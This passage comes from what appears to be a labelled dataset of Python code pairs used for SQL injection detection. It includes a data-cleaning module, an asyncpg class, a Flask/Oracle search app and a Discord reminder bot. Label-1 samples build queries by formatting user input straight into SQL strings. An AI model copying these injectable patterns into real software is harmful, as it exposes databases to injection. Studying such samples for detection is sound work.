if new_type == 'TIMESTAMP':\n        if current_type == 'date':\n            db.engine.execute(\n                'ALTER TABLE {0} '\n                'ALTER COLUMN \"{1}\" '\n                'TYPE TIMESTAMP WITH TIME ZONE'\n                .format(table_name, table_col))\n        else:\n            db.engine.execute(\n                'ALTER TABLE {0} '\n                'ALTER COLUMN \"{1}\" '\n                'TYPE TIMESTAMP WITH TIME ZONE '\n                'USING to_timestamp(\"{1}\", \\'DD/MM/YYYY HH24:MI:SS\\')'\n                .format(table_name, table_col))\n\n\ndef drop_attribute(table_name, attr):\n    \"\"\"\n    Drops given attribute from given table\n    :param table_name: table to perform the operation on\n    :param attr: attribute to drop\n    \"\"\"\n    try:\n        db.engine.execute(\n            'ALTER TABLE \"{0}\" DROP COLUMN IF EXISTS \"{1}\"'.\n            format(table_name, attr)\n        )\n    except:\n        print(\"FAILED TO DROP ATTRIBUTE {0} FROM {1}\".format(attr, table_name))\n\n\ndef one_hot_encode(table_name, attr):\n    \"\"\"\n    One hot encodes given attribute\n    :param table_name: table on which to perform the operation\n    :param attr: attribute to one hot encode\n    :return:\n    \"\"\"\n    try:\n        dataframe = pd.read_sql_table(table_name, db.engine)\n        one_hot = pd.get_dummies(dataframe[attr])\n        print('OH', one_hot)\n        dataframe = dataframe.join(one_hot)\n        print('DF', dataframe)\n        db.engine.execute(\n            'DROP TABLE \"{0}\"'.format(table_name)\n        )\n        dataframe.to_sql(\n            name=table_name,\n            con=db.engine,\n            if_exists=\"fail\",\n            index=False\n        )\n    except:\n        print('ONE-HOT ENCODING FAILED')\n\n\ndef fill_null_with(table_name, attr, value, text_type):\n    \"\"\"\n    Fills all NULL values with provided value in table_name.attr\n    :param table_name: table to perform the operation on\n    :param attr: attribute containing NULL values\n    :param text_type: indicates whether column is a text type\n    :param value: value to insert\n    \"\"\"\n    try:\n        if text_type:\n            db.engine.execute(\n                'UPDATE \"{0}\" '\n                'SET \"{1}\" = \\'{2}\\' '\n                'WHERE (\"{1}\" = \\'\\') IS NOT FALSE'\n                .format(table_name, attr, value)\n            )\n        else:\n            db.engine.execute(\n                'UPDATE \"{0}\" '\n                'SET \"{1}\" = {2} '\n                'WHERE \"{1}\" IS NULL'\n                .format(table_name, attr, value)\n            )\n    except Exception as e:\n        print('FILL NULL FAILED WITH FOLLOWING MESSAGE:\\n' + str(e))\n\n\ndef fill_null_with_average(table_name, attr):\n    \"\"\"\n    Fills all NULL values with average value in table_name.attr\n    :param table_name: table to perform the operation on\n    :param attr: attribute containing NULL values\n    \"\"\"\n    try:\n        dataframe = pd.read_sql_table(table_name, db.engine, columns=[attr])\n        average = dataframe[attr].mean()\n        db.engine.execute(\n            'UPDATE \"{0}\" '\n            'SET \"{1}\" = {2} '\n            'WHERE \"{1}\" IS NULL'\n            .format(table_name, attr, average)\n        )\n    except:\n        print('FILL AVERAGE FAILED')\n\n\ndef fill_null_with_median(table_name, attr):\n    \"\"\"\n    Fills all NULL values with median value in table_name.attr\n    :param table_name: table to perform the operation on\n    :param attr: attribute containing NULL values\n    \"\"\"\n    try:\n        dataframe = pd.read_sql_table(table_name, db.engine, columns=[attr])\n        median = dataframe[attr].median()\n        db.engine.execute(\n            'UPDATE \"{0}\" '\n            'SET \"{1}\" = {2} '\n            'WHERE \"{1}\" IS NULL'\n            .format(table_name, attr, median)\n        )\n    except:\n        print('FILL MEAN FAILED')\n\n\ndef find_replace(table_name, attr, find, replace):\n    try:\n        db.engine.execute(\n            'UPDATE \"{0}\" '\n            'SET \"{1}\" = \\'{2}\\' '\n            'WHERE \"{1}\" = \\'{3}\\' '\n            .format(table_name, attr, replace, find)\n        )\n    except:\n        print('FIND-REPLACE FAILED')\n\n\ndef substring_find_replace(table_name, attr, find, replace, full=False):\n    try:\n        if full:\n            db.engine.execute(\n                'UPDATE \"{0}\" '\n                'SET \"{1}\" = \\'{2}\\' '\n                'WHERE \"{1}\" LIKE \\'%%{3}%%\\' '\n                .format(table_name, attr, replace, find)\n            )\n        else:\n            db.engine.execute(\n                'UPDATE \"{0}\" '\n                'SET \"{1}\" = REPLACE(\"{1}\", \\'{2}\\', \\'{3}\\')'\n                .format(table_name, attr, find, replace)\n            )\n    except Exception as e:\n        print('FIND-REPLACE FAILED\\n' + str(e))\n\n\ndef regex_find_replace(table_name, attr, regex, replace):\n    try:\n        is_valid = True\n        try:\n            re.compile(regex)\n        except re.error:\n            is_valid = False\n        if is_valid:\n            db.engine.execute(\n                'UPDATE \"{0}\" '\n                'SET \"{1}\" = REGEXP_REPLACE(\"{1}\", \\'{2}\\', \\'{3}\\')'\n                .format(table_name, attr, regex, replace)\n            )\n    except Exception as e:\n        print('REGEX FIND-REPLACE FAILED:\\n' + str(e))\n\n\ndef normalize_attribute(table_name, attr):\n    \"\"\"\n    Normalizes table_name.attr using z-score method\n    :param table_name: table to perform the operation on\n    :param attr: attribute to normalize\n    \"\"\"\n    try:\n        df = pd.read_sql_table(table_name, db.engine)\n        df[attr] = (df[attr] - df[attr].mean()) / df[attr].std(ddof=0)\n        db.engine.execute(\n            'DROP TABLE \"{0}\"'.format(table_name)\n        )\n        df.to_sql(name=table_name, con=db.engine, if_exists=\"fail\", index=False)\n    except:\n        print('NORMALIZATION FAILED')\n\n\ndef remove_outliers(table_name, attr, value, smaller_than=False):\n    \"\"\"\n    Removes outliers based on provided value\n    :param table_name: table to perform the operation on\n    :param attr: attribute to search for outliers\n    :param value: extrema value\n    :param smaller_than:  if true values smaller than are filtered,\n                          values greater than otherwise\n    \"\"\"\n    try:\n        if smaller_than:\n            db.engine.execute(\n                'DELETE FROM \"{0}\" '\n                'WHERE \"{1}\" < {2}'\n                .format(table_name, attr, value)\n            )\n        else:  # greater than\n            db.engine.execute(\n                'DELETE FROM \"{0}\" '\n                'WHERE \"{1}\" > {2}'\n                .format(table_name, attr, value)\n            )\n    except:\n        print('REMOVE OUTLIERS FAILED')\n\n\ndef delete_rows(table_name, condition):\n\n    db.engine.execute(\n        'DELETE FROM \"{0}\" WHERE {1}'.format(table_name, condition)\n    )\n\n\ndef discretize_width(table_name, attr, intervals, dataframe=None, name=None):\n    \"\"\"\n    Discretizes table_name.attr into a number of equal-width\n    intervals equal to interval amount\n    :param table_name: table to perform operation on\n    :param attr: attribute to discretize\n    :param intervals:\n        - int: number of equal width intervals\n        - [int]: non-uniform interval edges\n    :param dataframe: Dataframe if data has already been read from sql\n    \"\"\"\n    try:\n        if dataframe is not None:\n            df = dataframe\n        else:\n            df = pd.read_sql_table(table_name, db.engine)\n        if name is not None:\n            column_name = name\n        elif isinstance(intervals, list):\n            column_name = attr + '_custom_intervals'\n        else:\n            column_name = attr + '_' + str(intervals) + '_eq_intervals'\n\n        df[column_name] = pd.cut(df[attr], intervals, precision=9).apply(str)\n        db.engine.execute(\n            'DROP TABLE \"{0}\"'.format(table_name)\n        )\n        df.to_sql(name=table_name, con=db.engine, if_exists=\"fail\", index=False)\n    except Exception as e:\n        print('WIDTH DISCRETIZATION FAILED:\\n' + str(e))\n\n\ndef discretize_eq_freq(table_name, attr, intervals):\n    \"\"\"\n    Discretizes table_name.attr into a number of equal-frequency\n    intervals equal to intervals\n    :param table_name: table to perform operation on\n    :param attr: attribute to discretize\n    :param intervals: number of equal frequency intervals\n    \"\"\"\n    try:\n        df = pd.read_sql_table(table_name, db.engine)\n        attr_length = len(df[attr])\n        elements_per_interval = attr_length//intervals\n        sorted_data = list(df[attr].sort_values())\n        selector = 0\n        edge_list = []\n        while selector < attr_length:\n            try:\n                edge_list.append(sorted_data[selector])\n                selector += elements_per_interval\n            except IndexError:\n                pass\n        if edge_list[-1] != sorted_data[-1] and len(edge_list) == intervals + 1:\n            edge_list[-1] = sorted_data[-1]\n        elif edge_list[-1] != sorted_data[-1] and len(edge_list) != intervals + 1:\n            edge_list.append(sorted_data[-1])\n\n        # Extend outer edges with 0.1% to include min and max values\n        edge_list[0] = edge_list[0]-edge_list[0]*0.001\n        edge_list[-1] = edge_list[-1]+edge_list[-1]*0.001\n\n        column_name = attr + '_' + str(intervals) + '_eq_freq_intervals'\n\n        discretize_width(table_name, attr, edge_list, df, column_name)\n    except Exception as e:\n        print('EQUAL FREQUENCY DISCRETIZATION FAILED:\\n' + str(e))\n/n/n/n", "label": 1}, {"id": "0a8d81f7ecc5a7073e57f84584e7f07557edad8b", "code": "utils/user_funcs.py/n/n#!bin/env python\n\nimport asyncpg\n\nclass PGDB:\n    def __init__(self, db_conn):\n        self.db_conn = db_conn\n\n    async def fetch_user_info(self, member_id: int, column: str):\n        query = f'''SELECT {column} FROM user_info WHERE member_id = {member_id};'''\n        return await self.db_conn.fetchval(query)\n\n    async def insert_user_info(self, member_id: int, column: str, col_value):\n        execute = (\n            f'''INSERT INTO user_info (member_id, $1) VALUES ($2, $3)\n                    ON CONFLICT member_id DO UPDATE SET $1 = $3;''')\n        await self.db_conn.execute(execute, column, member_id, col_value)\n/n/n/n", "label": 0}, {"id": "0a8d81f7ecc5a7073e57f84584e7f07557edad8b", "code": "/utils/user_funcs.py/n/n#!bin/env python\n\nimport asyncpg\n\nclass PGDB:\n    def __init__(self, db_conn):\n        self.db_conn = db_conn\n\n    async def fetch_user_info(self, member_id: int, column: str):\n        query = f'''SELECT {column} FROM user_info WHERE member_id = {member_id};'''\n        return await self.db_conn.fetchval(query)\n\n    async def insert_user_info(self, member_id: int, column: str, col_value):\n        execute = (\n            f\"\"\"INSERT INTO user_info (member_id, {column}) \n                    VALUES ({member_id}, {col_value})\n                    ON CONFLICT (member_id)\n                        DO UPDATE SET {column} = {col_value};\"\"\")\n        await self.db_conn.execute(execute)\n/n/n/n", "label": 1}, {"id": "f7e35633925d7f93d6ca09c635c5d85af5509f11", "code": "comics-app/comics.py/n/nfrom flask import Flask, g, render_template, request, jsonify, abort\nfrom utils import get_db, get_queries, ajax, execute_query, generic_search\nimport utils\nimport os\nimport atexit\n\napp = Flask(__name__)\ncontext = {}\n\n# Set app configuration\napp.config.update({'DB_USER': os.environ['IDBS_USER'],\n                   'DB_PWD': os.environ['IDBS_PWD'],\n                   'DB_SERVER': 'diassrv2.epfl.ch',\n                   'DB_PORT': 1521,\n                   'DB_SID': 'orcldias',\n                   'DEBUG': True,\n                   'QUERIES_PATH': 'queries.sql'})\n\n\n@app.route('/')\ndef home():\n    con = get_db(app)\n    return render_template('index.html')\n\n\n@app.route('/search', methods=['GET', 'POST'])\n@ajax\ndef search():\n    # If GET, return the form to render\n    if request.method == 'GET':\n        return render_template('search-form.html')\n\n    # If POST, process the query and return data\n    keywords = request.form['keywords']\n    tables = list(request.form.keys())\n    tables.remove('keywords')\n\n    try:\n        data = generic_search(get_db(app), keywords, tables)\n        return jsonify(data)\n    except ValueError:\n        # Invalid user input\n        return abort(401)\n\n\n@app.route('/queries', methods=['GET', 'POST'])\n@ajax\ndef queries():\n    if request.method == 'GET':\n        return render_template('queries-form.html', queries=get_queries(app, context))\n\n    # Get query and execute it\n    query_key = request.form['query-selector']\n    query = get_queries(app, context)[query_key]\n    (schema, data) = execute_query(get_db(app), query)\n\n    return jsonify([('', schema, data)])\n\n\n@app.route('/get_table_names', methods=['GET'])\n@ajax\ndef get_table_names():\n    return jsonify(utils.get_table_names(get_db(app)))\n\n\n@app.teardown_appcontext\ndef close_db(error):\n    \"\"\"Closes the database again at the end of the request.\"\"\"\n    if hasattr(g, 'db'):\n        g.db.close()\n/n/n/ncomics-app/utils.py/n/nfrom flask import abort, request, g\nfrom functools import wraps\nimport cx_Oracle\nimport re\n\n\ndef execute_query(con, query, **kwargs):\n    \"\"\" Execute a query and return corresponding data \"\"\"\n    # Execute query\n    cur = con.cursor()\n    cur.execute(query, kwargs)\n\n    # Return data with description\n    return (extract_schema(cur.description), cur.fetchall())\n\n\ndef generic_search(con, keywords, tables):\n    \"\"\" Perform a search in the given tables for containment of given keywords \"\"\"\n    # List of tuples (table_name, schema, tuples)\n    result = []\n    table_names = get_table_names(con)\n    for table in tables:\n        # Make sure user didn't cheat with table names\n        if table not in table_names:\n            raise ValueError('Invalid table name')\n\n        # Build conditions\n        conditions = []\n        for col in get_column_names(con, table):\n            conditions.append('{} LIKE \\'%\\'||:keywords||\\'%\\''.format(col))\n\n        conditions = ' OR '.join(conditions)\n\n        # Execute query\n        query = 'SELECT * FROM {} WHERE {}'.format(table, conditions)\n        (schema, data) = execute_query(con, query, keywords=keywords)\n\n        if len(data) > 0:\n            result.append((table, schema, data))\n\n    return result\n\n\ndef extract_schema(description):\n    \"\"\" Extract column names from cursor description \"\"\"\n    names = []\n    for col in description:\n        names.append(col[0])\n\n    return names\n\n\ndef ajax(f):\n    \"\"\" Custom decoractor to restrict acces to AJAX calls \"\"\"\n    @wraps(f)\n    def decorated_function(*args, **kwargs):\n        if not request.is_xhr:\n            return abort(401)\n        return f(*args, **kwargs)\n    return decorated_function\n\n\ndef get_db(app):\n    \"\"\" Connect to the database and return connection \"\"\"\n    if not hasattr(g, 'db'):\n        dsn_tns = cx_Oracle.makedsn(app.config['DB_SERVER'],\n                                    app.config['DB_PORT'],\n                                    app.config['DB_SID'])\n\n        g.db = cx_Oracle.connect(app.config['DB_USER'],\n                                 app.config['DB_PWD'],\n                                 dsn_tns)\n\n    return g.db\n\n\ndef get_queries(app, context):\n    \"\"\" Parse, cache and return predefined queries \"\"\"\n    if 'queries' not in context:\n        with open(app.config['QUERIES_PATH'], 'r') as fd:\n            sqlFile = fd.read()\n\n        # all SQL commands (split on ';')\n        sqlCommands = sqlFile.split(';')\n        context['queries'] = {}\n        for command in sqlCommands:\n            command = re.sub(r'\\s*--\\s*|\\s*\\n\\s*', ' ', command)\n            query = command.split(':')\n            context['queries'][query[0]] = query[1]\n\n    return context['queries']\n\n\ndef get_table_names(con):\n    \"\"\" Return database tables names \"\"\"\n    query = 'SELECT table_name FROM user_tables'\n    data = execute_query(con, query)[1]\n    return list(map(lambda x: x[0], data))\n\n\ndef get_column_names(con, table):\n    \"\"\" Return table column names \"\"\"\n    query = 'SELECT * FROM {} WHERE 1=0'.format(table)\n    return execute_query(con, query)[0]\n/n/n/n", "label": 0}, {"id": "f7e35633925d7f93d6ca09c635c5d85af5509f11", "code": "/comics-app/comics.py/n/nfrom flask import Flask, g, render_template, request, jsonify\nfrom utils import get_db, get_queries, shutdown, ajax, execute_query, generic_search\nimport os\nimport atexit\n\napp = Flask(__name__)\n\n# Register clean up function\natexit.register(shutdown, app=app, context=g)\n\n# Set app configuration\napp.config.update({'DB_USER': os.environ['IDBS_USER'],\n                   'DB_PWD': os.environ['IDBS_PWD'],\n                   'DB_SERVER': 'diassrv2.epfl.ch',\n                   'DB_PORT': 1521,\n                   'DB_SID': 'orcldias',\n                   'DEBUG': True,\n                   'QUERIES_PATH': 'queries.sql'})\n\n\n@app.route('/')\ndef home():\n    con = get_db(app, g)\n    return render_template('index.html')\n\n\n@app.route('/search', methods=['GET', 'POST'])\n@ajax\ndef search():\n    # If GET, return the form to render\n    if request.method == 'GET':\n        return render_template('search-form.html')\n\n    # If POST, process the query and return data\n    keywords = request.form['keywords']\n    tables = list(request.form.keys())\n    tables.remove('keywords')\n\n    data = generic_search(keywords, tables, app, g)\n    return jsonify(data)\n\n\n@app.route('/queries', methods=['GET', 'POST'])\n@ajax\ndef queries():\n    if request.method == 'GET':\n        return render_template('queries-form.html', queries=get_queries(app, g))\n\n    # Get query and execute it\n    query_key = request.form['query-selector']\n    query = get_queries(app, g)[query_key]\n    (schema, data) = execute_query(app, g, query)\n\n    return jsonify([('', schema, data)])\n\n\n@app.route('/get_table_names', methods=['GET'])\n@ajax\ndef get_table_names():\n    query = 'SELECT table_name FROM user_tables'\n    data = execute_query(app, g, query)[1]\n    return jsonify(data)\n/n/n/n/comics-app/utils.py/n/nfrom flask import abort, request\nfrom functools import wraps\nimport cx_Oracle\nimport re\n\n\ndef get_db(app, context):\n    \"\"\" Connect to the database and return connection \"\"\"\n    if not hasattr(context, 'db'):\n        dsn_tns = cx_Oracle.makedsn(app.config['DB_SERVER'],\n                                    app.config['DB_PORT'],\n                                    app.config['DB_SID'])\n\n        context.db = cx_Oracle.connect(app.config['DB_USER'],\n                                       app.config['DB_PWD'],\n                                       dsn_tns)\n\n    return context.db\n\n\ndef get_queries(app, context):\n    \"\"\" Parse and return predefined queries \"\"\"\n    if not hasattr(context, 'queries'):\n        with open(app.config['QUERIES_PATH'], 'r') as fd:\n            sqlFile = fd.read()\n\n        # all SQL commands (split on ';')\n        sqlCommands = sqlFile.split(';')\n        context.queries = {}\n        for command in sqlCommands:\n            command = re.sub(r'\\s*--\\s*|\\s*\\n\\s*', ' ', command)\n            query = command.split(':')\n            context.queries[query[0]] = query[1]\n\n    return context.queries\n\n\ndef execute_query(app, context, query):\n    \"\"\" Execute a query and return corresponding data \"\"\"\n    # Execute query\n    con = get_db(app, context)\n    cur = con.cursor()\n    cur.execute(query)\n\n    # Return data with description\n    return (extract_schema(cur.description), cur.fetchall())\n\n\ndef generic_search(keywords, tables, app, context):\n    # List of tuples (table_name, schema, tuples)\n    result = []\n    for table in tables:\n        # Get columns for the table\n        query = 'SELECT * FROM {} WHERE 1=0'.format(table)\n        description = execute_query(app, context, query)[0]\n\n        # Build conditions\n        conditions = []\n        for col in description:\n            conditions.append('{} LIKE \\'%{}%\\''.format(col, keywords))\n\n        conditions = ' OR '.join(conditions)\n\n        # Execute query\n        query = 'SELECT * FROM {} WHERE {}'.format(table, conditions)\n        (schema, data) = execute_query(app, context, query)\n        result.append((table, schema, data))\n\n    return result\n\n\ndef extract_schema(description):\n    names = []\n    for col in description:\n        names.append(col[0])\n\n    return names\n\n\ndef shutdown(app, context):\n    \"\"\" Clean-up application state before shutdown \"\"\"\n    with app.app_context():\n        get_db(app, context).close()\n\n\ndef ajax(f):\n    \"\"\" Custom decoractor to restrict acces to AJAX calls \"\"\"\n    @wraps(f)\n    def decorated_function(*args, **kwargs):\n        if not request.is_xhr:\n            return abort(401)\n        return f(*args, **kwargs)\n    return decorated_function\n/n/n/n", "label": 1}, {"id": "10908191888bd37f31242bfd7d71c15c6f6fb10b", "code": "cmds/remindme.py/n/nfrom datetime import datetime, timedelta\nfrom time import localtime, strftime\nimport sqlite3\n\n\n# Get the new date from string time/date\ndef get_date(time):\n    now = datetime.now()\n    if ',' in time:\n        times = time.split(',')\n        for t in times:\n            val = t\n            if 's' in val:\n                val = val.replace('s', '')\n                now += timedelta(seconds=int(val))\n            elif 'm' in val:\n                val = val.replace('m', '')\n                now += timedelta(minutes=int(val))\n            elif 'h' in val:\n                val = val.replace('h', '')\n                now += timedelta(hours=int(val))\n            elif 'd' in val:\n                val = val.replace('d', '')\n                now += timedelta(days=int(val))\n    else:\n        val = time\n        if 's' in val:\n            val = val.replace('s', '')\n            now += timedelta(seconds=int(val))\n        elif 'm' in val:\n            val = val.replace('m', '')\n            now += timedelta(minutes=int(val))\n        elif 'h' in val:\n            val = val.replace('h', '')\n            now += timedelta(hours=int(val))\n        elif 'd' in val:\n            val = val.replace('d', '')\n            now += timedelta(days=int(val))\n    return now\n\n\n# RemindMe command\nasync def ex_me(dclient, channel, mention, con, con_ex, author_id, a, log_file, cmd_char):\n    a = a.split(' ')\n    if len(a) >= 2:\n        time = a[0].lower()\n        msg = ''\n        for i in range(1, len(a)):\n            msg += a[i] + ' '\n        if 'd' in time or 'h' in time or 'm' in time or 's' in time or ',' in time:\n            date = get_date(time)\n            try:\n                con_ex.execute(\"INSERT INTO reminder (type, channel, message, date) VALUES ('0', ?, ?, ?);\",\n                               (author_id, msg, date.strftime('%Y-%m-%d %X')))\n                con.commit()\n                await dclient.send_message(channel, '{}, will remind you.'.format(mention))\n            except sqlite3.Error as e:\n                await dclient.send_message(channel, '{}, error when trying to add info to database! Please notifiy '\n                                                    'the admins!'.format(mention))\n                print('[{}]: {} - {}'.format(strftime(\"%b %d, %Y %X\", localtime()), 'SQLITE',\n                                             'Error when trying to insert data: ' + e.args[0]))\n                log_file.write('[{}]: {} - {}\\n'.format(strftime(\"%b %d, %Y %X\", localtime()), 'SQLITE',\n                                                        'Error when trying to insert data: ' + e.args[0]))\n        else:\n            await dclient.send_message(channel, '{}, The time must be in #time format (ex: 1h or 2h,5m).'\n                                       .format(mention, cmd_char))\n    else:\n        await dclient.send_message(channel, '{}, **USAGE:** {}remindme <time> <message...>'.format(mention, cmd_char))\n\n\n# RemindAll command\nasync def ex_all(dclient, channel, mention, con, con_ex, channel_id, a, log_file, cmd_char):\n    a = a.split(' ')\n    if len(a) >= 2:\n        time = a[0].lower()\n        msg = ''\n        for i in range(1, len(a)):\n            msg += a[i] + ' '\n        if 'd' in time or 'h' in time or 'm' in time or 's' in time or ',' in time:\n            date = get_date(time)\n            try:\n                con_ex.execute(\"INSERT INTO reminder (type, channel, message, date) VALUES ('1', ?, ?, ?);\",\n                               (channel_id, msg, str(date)))\n                con.commit()\n                await dclient.send_message(channel, '{}, will remind you.'.format(mention))\n            except sqlite3.Error as e:\n                await dclient.send_message(channel, '{}, error when trying to add info to database! Please notifiy '\n                                                    'the admins!'.format(mention))\n                print('[{}]: {} - {}'.format(strftime(\"%b %d, %Y %X\", localtime()), 'SQLITE',\n                                             'Error when trying to insert data: ' + e.args[0]))\n                log_file.write('[{}]: {} - {}\\n'.format(strftime(\"%b %d, %Y %X\", localtime()), 'SQLITE',\n                                                        'Error when trying to insert data: ' + e.args[0]))\n        else:\n            await dclient.send_message(channel, '{}, The time must be in #time format (ex: 1h or 2h,5m).'\n                                       .format(mention, cmd_char))\n    else:\n        await dclient.send_message(channel, '{}, **USAGE:** {}remindall <time> <message...>'.format(mention, cmd_char))\n/n/n/n", "label": 0}, {"id": "10908191888bd37f31242bfd7d71c15c6f6fb10b", "code": "/cmds/remindme.py/n/nfrom datetime import datetime, timedelta\nfrom time import localtime, strftime\nimport sqlite3\n\n\n# Get the new date from string time/date\ndef get_date(time):\n    now = datetime.now()\n    if ',' in time:\n        times = time.split(',')\n        for t in times:\n            val = t\n            if 's' in val:\n                val = val.replace('s', '')\n                now += timedelta(seconds=int(val))\n            elif 'm' in val:\n                val = val.replace('m', '')\n                now += timedelta(minutes=int(val))\n            elif 'h' in val:\n                val = val.replace('h', '')\n                now += timedelta(hours=int(val))\n            elif 'd' in val:\n                val = val.replace('d', '')\n                now += timedelta(days=int(val))\n    else:\n        val = time\n        if 's' in val:\n            val = val.replace('s', '')\n            now += timedelta(seconds=int(val))\n        elif 'm' in val:\n            val = val.replace('m', '')\n            now += timedelta(minutes=int(val))\n        elif 'h' in val:\n            val = val.replace('h', '')\n            now += timedelta(hours=int(val))\n        elif 'd' in val:\n            val = val.replace('d', '')\n            now += timedelta(days=int(val))\n    return now\n\n\n# RemindMe command\nasync def ex_me(dclient, channel, mention, con, con_ex, author_id, a, log_file, cmd_char):\n    a = a.split(' ')\n    if len(a) >= 2:\n        time = a[0].lower()\n        msg = ''\n        for i in range(1, len(a)):\n            msg += a[i] + ' '\n        if 'd' in time or 'h' in time or 'm' in time or 's' in time or ',' in time:\n            date = get_date(time)\n            try:\n                con_ex.execute(\"INSERT INTO reminder (type, channel, message, date) VALUES ('0', {}, '{}', '{}');\"\n                               .format(author_id, msg, date.strftime('%Y-%m-%d %X')))\n                con.commit()\n                await dclient.send_message(channel, '{}, will remind you.'.format(mention))\n            except sqlite3.Error as e:\n                await dclient.send_message(channel, '{}, error when trying to add info to database! Please notifiy '\n                                                    'the admins!'.format(mention))\n                print('[{}]: {} - {}'.format(strftime(\"%b %d, %Y %X\", localtime()), 'SQLITE',\n                                             'Error when trying to insert data: ' + e.args[0]))\n                log_file.write('[{}]: {} - {}\\n'.format(strftime(\"%b %d, %Y %X\", localtime()), 'SQLITE',\n                                                        'Error when trying to insert data: ' + e.args[0]))\n        else:\n            await dclient.send_message(channel, '{}, The time must be in #time format (ex: 1h or 2h,5m).'\n                                       .format(mention, cmd_char))\n    else:\n        await dclient.send_message(channel, '{}, **USAGE:** {}remindme <time> <message...>'.format(mention, cmd_char))\n        print('')\n\n\n# RemindAll command\nasync def ex_all(dclient, channel, mention, con, con_ex, channel_id, a, log_file, cmd_char):\n    a = a.split(' ')\n    if len(a) >= 2:\n        time = a[0].lower()\n        msg = ''\n        for i in range(1, len(a)):\n            msg += a[i] + ' '\n        if 'd' in time or 'h' in time or 'm' in time or 's' in time or ',' in time:\n            date = get_date(time)\n            try:\n                con_ex.execute(\"INSERT INTO reminder (type, channel, message, date) VALUES ('1', {}, '{}', '{}');\"\n                               .format(channel_id, msg, str(date)))\n                con.commit()\n                await dclient.send_message(channel, '{}, will remind you.'.format(mention))\n            except sqlite3.Error as e:\n                await dclient.send_message(channel, '{}, error when trying to add info to database! Please notifiy '\n                                                    'the admins!'.format(mention))\n                print('[{}]: {} - {}'.format(strftime(\"%b %d, %Y %X\", localtime()), 'SQLITE',\n                                             'Error when trying to insert data: ' + e.args[0]))\n                log_file.write('[{}]: {} - {}\\n'.format(strftime(\"%b %d, %Y %X\", localtime()), 'SQLITE',\n                                                        'Error when trying to insert data: ' + e.args[0]))\n        else:\n            await dclient.send_message(channel, '{}, The time must be in #time format (ex: 1h or 2h,5m).'\n                                       .format(mention, cmd_char))\n    else:\n        await dclient.send_message(channel, '{}, **USAGE:** {}remindall <time> <message...>'.format(mention, cmd_char))\n        print('')\n/n/n/n", "label": 1}, {"id": "2158db051408e0d66210a99b17c121be008e20b6", "code": "flask_appbuilder/models/sqla/interface.py/n/n# -*- coding: utf-8 -*-\nimport sys\nimport logging\nimport sqlalchemy as sa\n\nfrom . import filters\nfrom sqlalchemy.orm import joinedload\nfrom sqlalchemy.exc import IntegrityError\nfrom sqlalchemy import func\nfrom sqlalchemy.orm.properties import SynonymProperty\n\nfrom ..base import BaseInterface\nfrom ..group import GroupByDateYear, GroupByDateMonth, GroupByCol\nfrom ..mixins import FileColumn, ImageColumn\nfrom ...filemanager import FileManager, ImageManager\nfrom ..._compat import as_unicode\nfrom ...const import LOGMSG_ERR_DBI_ADD_GENERIC, LOGMSG_ERR_DBI_EDIT_GENERIC, LOGMSG_ERR_DBI_DEL_GENERIC, \\\n    LOGMSG_WAR_DBI_ADD_INTEGRITY, LOGMSG_WAR_DBI_EDIT_INTEGRITY, LOGMSG_WAR_DBI_DEL_INTEGRITY\n\nlog = logging.getLogger(__name__)\n\n\ndef _include_filters(obj):\n    for key in filters.__all__:\n        if not hasattr(obj, key):\n            setattr(obj, key, getattr(filters, key))\n\n\nclass SQLAInterface(BaseInterface):\n    \"\"\"\n    SQLAModel\n    Implements SQLA support methods for views\n    \"\"\"\n    session = None\n\n    filter_converter_class = filters.SQLAFilterConverter\n\n    def __init__(self, obj, session=None):\n        _include_filters(self)\n        self.list_columns = dict()\n        self.list_properties = dict()\n\n        self.session = session\n        # Collect all SQLA columns and properties\n        for prop in sa.orm.class_mapper(obj).iterate_properties:\n            if type(prop) != SynonymProperty:\n                self.list_properties[prop.key] = prop\n        for col_name in obj.__mapper__.columns.keys():\n            if col_name in self.list_properties:\n                self.list_columns[col_name] = obj.__mapper__.columns[col_name]\n        super(SQLAInterface, self).__init__(obj)\n\n    @property\n    def model_name(self):\n        \"\"\"\n            Returns the models class name\n            useful for auto title on views\n        \"\"\"\n        return self.obj.__name__\n\n    def _get_base_query(self, query=None, filters=None, order_column='', order_direction=''):\n        if filters:\n            query = filters.apply_all(query)\n        if order_column != '':\n            # if Model has custom decorator **renders('<COL_NAME>')**\n            # this decorator will add a property to the method named *_col_name*\n            if hasattr(self.obj, order_column):\n                if hasattr(getattr(self.obj, order_column), '_col_name'):\n                    order_column = getattr(getattr(self.obj, order_column), '_col_name')\n            query = query.order_by(\"%s %s\" % (order_column, order_direction))\n        return query\n\n    def query(self, filters=None, order_column='', order_direction='',\n              page=None, page_size=None):\n        \"\"\"\n            QUERY\n            :param filters:\n                dict with filters {<col_name>:<value,...}\n            :param order_column:\n                name of the column to order\n            :param order_direction:\n                the direction to order <'asc'|'desc'>\n            :param page:\n                the current page\n            :param page_size:\n                the current page size\n\n        \"\"\"\n        query = self.session.query(self.obj)\n        if len(order_column.split('.')) >= 2:\n            tmp_order_column = ''\n            for join_relation in order_column.split('.')[:-1]:\n                model_relation = self.get_related_model(join_relation)\n                query = query.join(model_relation)\n                # redefine order column name, because relationship can have a different name\n                # from the related table name.\n                tmp_order_column = tmp_order_column + model_relation.__tablename__ + '.'\n            order_column = tmp_order_column + order_column.split('.')[-1]\n        query_count = self.session.query(func.count('*')).select_from(self.obj)\n\n        query_count = self._get_base_query(query=query_count,\n                                           filters=filters)\n        query = self._get_base_query(query=query,\n                                     filters=filters,\n                                     order_column=order_column,\n                                     order_direction=order_direction)\n\n        count = query_count.scalar()\n\n        if page:\n            query = query.offset(page * page_size)\n        if page_size:\n            query = query.limit(page_size)\n\n        return count, query.all()\n\n    def query_simple_group(self, group_by='', aggregate_func=None, aggregate_col=None, filters=None):\n        query = self.session.query(self.obj)\n        query = self._get_base_query(query=query, filters=filters)\n        query_result = query.all()\n        group = GroupByCol(group_by, 'Group by')\n        return group.apply(query_result)\n\n    def query_month_group(self, group_by='', filters=None):\n        query = self.session.query(self.obj)\n        query = self._get_base_query(query=query, filters=filters)\n        query_result = query.all()\n        group = GroupByDateMonth(group_by, 'Group by Month')\n        return group.apply(query_result)\n\n    def query_year_group(self, group_by='', filters=None):\n        query = self.session.query(self.obj)\n        query = self._get_base_query(query=query, filters=filters)\n        query_result = query.all()\n        group_year = GroupByDateYear(group_by, 'Group by Year')\n        return group_year.apply(query_result)\n\n    \"\"\"\n    -----------------------------------------\n         FUNCTIONS for Testing TYPES\n    -----------------------------------------\n    \"\"\"\n\n    def is_image(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, ImageColumn)\n        except:\n            return False\n\n    def 